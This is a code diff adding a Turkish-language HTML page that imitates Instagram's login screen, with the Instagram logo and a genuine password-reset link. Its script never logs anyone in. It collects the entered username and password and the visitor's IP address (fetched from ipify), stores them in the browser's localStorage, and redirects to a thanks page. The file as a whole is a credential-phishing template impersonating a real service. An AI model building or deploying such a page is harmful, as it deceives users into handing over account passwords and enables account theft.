@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Giriş</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 40px 50px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+      text-align: center;
+    }
+    .logo {
+      margin-bottom: 25px;
+    }
+    .logo img {
+      width: 150px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    input[type="text"], input[type="password"] {
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    button {
+      padding: 12px;
+      background: #3897f0;
+      border: none;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #2d79d5;
+    }
+    .forgot {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+    .forgot a {
+      color: #3897f0;
+      text-decoration: none;
+    }
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" />
+    </div>
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Kullanıcı Adı" autocomplete="username" required />
+      <input type="password" name="password" placeholder="Şifre" autocomplete="current-password" required />
+      <button type="submit">Giriş Yap</button>
+    </form>
+    <div class="forgot">
+      <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" rel="noopener noreferrer">Şifremi Unuttum?</a>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const username = this.username.value.trim();
+      const password = this.password.value.trim();
+
+      if (!username || !password) {
+        alert('Lütfen tüm alanları doldurun.');
+        return;
+      }
+
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip || 'Bilinmiyor';
+
+        let entries = JSON.parse(localStorage.getItem('loginEntries')) || [];
+        entries.push({ username, password, ip, time: new Date().toLocaleString() });
+        localStorage.setItem('loginEntries', JSON.stringify(entries));
+
+        window.location.href = 'thanks.html';
+      } catch (error) {
+        alert('IP adresi alınamadı, lütfen internet bağlantınızı kontrol edin.');
+      }
+    });
+  </script>
+
+</body>
+</html>
